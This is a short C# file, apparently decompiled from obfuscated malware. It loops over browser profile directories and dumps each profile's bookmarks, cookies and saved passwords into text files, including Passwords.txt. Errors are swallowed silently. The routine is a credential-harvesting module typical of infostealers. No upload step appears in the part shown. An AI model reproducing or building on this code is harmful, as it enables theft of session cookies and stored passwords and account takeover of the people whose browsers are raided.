using System.Collections.Generic;
using System.IO;

internal class Class76
{
	public static void smethod_0(string string_0)
	{
		string[] string_ = Class52.string_1;
		foreach (string text in string_)
		{
			try
			{
				string name = new DirectoryInfo(text).Name;
				string text2 = string_0 + "\\" + name;
				string text3 = Class52.string_3 + "\\" + text;
				if (Directory.Exists(text3 + "\\Profiles"))
				{
					Directory.CreateDirectory(text2);
					List<Struct4> list_ = Class78.smethod_0(text3);
					List<Struct0> list_2 = Class77.smethod_0(text3);
					List<GStruct0> list_3 = Class74.smethod_1(text3);
					Class58.smethod_7(list_, text2 + "\\Bookmarks.txt");
					Class58.smethod_5(list_2, string_0 + $"\\Cookies_{name}({Class37.smethod_1()}).txt");
					Class58.smethod_8(list_3, Class38.string_11 + "\\Passwords.txt");
				}
			}
			catch
			{
			}
		}
	}
}
